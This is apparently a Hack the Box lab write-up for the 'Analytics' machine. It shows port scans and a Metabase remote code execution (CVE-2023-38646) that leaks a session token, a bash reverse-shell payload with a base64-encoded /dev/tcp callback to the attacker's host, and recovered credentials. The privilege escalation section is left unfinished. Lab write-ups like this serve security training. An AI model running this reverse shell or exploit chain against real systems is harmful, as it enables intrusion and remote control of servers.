# Hack the Box - Analytics

```shell
> rustscan -b 1000 -u 5000 -r 0-65535 -a 10.10.11.233 -- -Pn
```
```shell
.----. .-. .-. .----..---.  .----. .---.   .--.  .-. .-.
| {}  }| { } |{ {__ {_   _}{ {__  /  ___} / {} \ |  `| |
| .-. \| {_} |.-._} } | |  .-._} }\     }/  /\  \| |\  |
`-' `-'`-----'`----'  `-'  `----'  `---' `-'  `-'`-' `-'
The Modern Day Port Scanner.
________________________________________
: https://discord.gg/GFrQsGy           :
: https://github.com/RustScan/RustScan :
 --------------------------------------
🌍HACK THE PLANET🌍

[~] The config file is expected to be at "/home/superuser/.rustscan.toml"
[~] Automatically increasing ulimit value to 5000.
Open 10.10.11.233:22
Open 10.10.11.233:80
[~] Starting Script(s)
[>] Script to be run Some("nmap -vvv -p {{port}} {{ip}}")

Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times may be slower.
[~] Starting Nmap 7.94 ( https://nmap.org ) at 2023-10-11 14:18 EDT
Initiating Connect Scan at 14:18
Scanning analytical.htb (10.10.11.233) [2 ports]
Discovered open port 80/tcp on 10.10.11.233
Discovered open port 22/tcp on 10.10.11.233
Completed Connect Scan at 14:18, 0.08s elapsed (2 total ports)
Nmap scan report for analytical.htb (10.10.11.233)
Host is up, received user-set (0.079s latency).
Scanned at 2023-10-11 14:18:03 EDT for 1s

PORT   STATE SERVICE REASON
22/tcp open  ssh     syn-ack
80/tcp open  http    syn-ack

Read data files from: /usr/bin/../share/nmap
Nmap done: 1 IP address (1 host up) scanned in 0.12 seconds
```

```shell
> rustscan -u 5000 -p 22,80 -a 10.10.11.233 -- -Pn -sCV
```
```shell
.----. .-. .-. .----..---.  .----. .---.   .--.  .-. .-.
| {}  }| { } |{ {__ {_   _}{ {__  /  ___} / {} \ |  `| |
| .-. \| {_} |.-._} } | |  .-._} }\     }/  /\  \| |\  |
`-' `-'`-----'`----'  `-'  `----'  `---' `-'  `-'`-' `-'
The Modern Day Port Scanner.
________________________________________
: https://discord.gg/GFrQsGy           :
: https://github.com/RustScan/RustScan :
 --------------------------------------
Nmap? More like slowmap.🐢

[~] The config file is expected to be at "/home/superuser/.rustscan.toml"
[~] Automatically increasing ulimit value to 5000.
Open 10.10.11.233:22
Open 10.10.11.233:80
[~] Starting Script(s)
[>] Script to be run Some("nmap -vvv -p {{port}} {{ip}}")

Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times may be slower.
[~] Starting Nmap 7.94 ( https://nmap.org ) at 2023-10-11 14:19 EDT
NSE: Loaded 156 scripts for scanning.
NSE: Script Pre-scanning.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 14:19
Completed NSE at 14:19, 0.00s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 14:19
Completed NSE at 14:19, 0.00s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 14:19
Completed NSE at 14:19, 0.00s elapsed
Initiating Connect Scan at 14:19
Scanning analytical.htb (10.10.11.233) [2 ports]
Discovered open port 80/tcp on 10.10.11.233
Discovered open port 22/tcp on 10.10.11.233
Completed Connect Scan at 14:19, 0.08s elapsed (2 total ports)
Initiating Service scan at 14:19
Scanning 2 services on analytical.htb (10.10.11.233)
Completed Service scan at 14:19, 6.17s elapsed (2 services on 1 host)
NSE: Script scanning 10.10.11.233.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 14:19
Completed NSE at 14:19, 2.51s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 14:19
Completed NSE at 14:19, 0.34s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 14:19
Completed NSE at 14:19, 0.00s elapsed
Nmap scan report for analytical.htb (10.10.11.233)
Host is up, received user-set (0.082s latency).
Scanned at 2023-10-11 14:19:29 EDT for 9s

PORT   STATE SERVICE REASON  VERSION
22/tcp open  ssh     syn-ack OpenSSH 8.9p1 Ubuntu 3ubuntu0.4 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 3e:ea:45:4b:c5:d1:6d:6f:e2:d4:d1:3b:0a:3d:a9:4f (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBJ+m7rYl1vRtnm789pH3IRhxI4CNCANVj+N5kovboNzcw9vHsBwvPX3KYA3cxGbKiA0VqbKRpOHnpsMuHEXEVJc=
|   256 64:cc:75:de:4a:e6:a5:b4:73:eb:3f:1b:cf:b4:e3:94 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIOtuEdoYxTohG80Bo6YCqSzUY9+qbnAFnhsk4yAZNqhM
80/tcp open  http    syn-ack nginx 1.18.0 (Ubuntu)
|_http-server-header: nginx/1.18.0 (Ubuntu)
| http-methods: 
|_  Supported Methods: GET HEAD
|_http-title: Analytical
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

NSE: Script Post-scanning.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 14:19
Completed NSE at 14:19, 0.00s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 14:19
Completed NSE at 14:19, 0.00s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 14:19
Completed NSE at 14:19, 0.00s elapsed
Read data files from: /usr/bin/../share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 9.68 seconds
```

TCP 80 - HTTP
![image](https://github.com/karanshergill/Hack-the-Box/assets/83878909/a7d29d8f-533f-47b7-9bb8-ea8e88ad51f2)

```http
http://data.analytical.htb/auth/login?redirect=%2F
```
![image](https://github.com/karanshergill/Hack-the-Box/assets/83878909/b2c852d7-68d7-4fa9-ae80-2f23bdd66dc6)
![image](https://github.com/karanshergill/Hack-the-Box/assets/83878909/5514d41e-fcac-4f3c-a712-ab91a93c47f7)

Metabase - Remote Code Execution (CVE-2023-38646)
Session Token Leaked
![image](https://github.com/karanshergill/Hack-the-Box/assets/83878909/b701daa7-c72c-4670-b417-eb345356740a)

Test Command Execution
```shell
python -m http.server 80
```
![image](https://github.com/karanshergill/Hack-the-Box/assets/83878909/91e7bbec-50db-44d8-97e7-7b27835991be)
![image](https://github.com/karanshergill/Hack-the-Box/assets/83878909/470a709c-3a69-4aa9-9868-ab9bd8b6c6a7)

Reverse Shell Payload
```shell
bash -c {echo,payload}|{base64,-d}|{bash,-i}
```

Shell Base64 encoded
```shell
> echo "sh -i >& /dev/tcp/10.10.14.23/1337 0>&1" | base64
c2ggLWkgPiYgL2Rldi90Y3AvMTAuMTAuMTQuMjMvMTMzNyAwPiYxCg==
```

![image](https://github.com/karanshergill/Hack-the-Box/assets/83878909/74ceef41-77e9-4af1-aea1-7fdbe072dcc7)
![image](https://github.com/karanshergill/Hack-the-Box/assets/83878909/0ed2a2c7-e3eb-43f1-afd2-edbbcee86ddb)
![image](https://github.com/karanshergill/Hack-the-Box/assets/83878909/9336028c-c5ce-4dd0-a10b-b684258108ef)
![image](https://github.com/karanshergill/Hack-the-Box/assets/83878909/fb9de20d-edbd-4769-9a1c-3abbf94fc677)

```shell
creds: metalytics:An4lytics_ds20223#
```
![image](https://github.com/karanshergill/Hack-the-Box/assets/83878909/31231793-fd25-4e45-994b-2623f742f1bd)

Privilege Escalation

Pending!
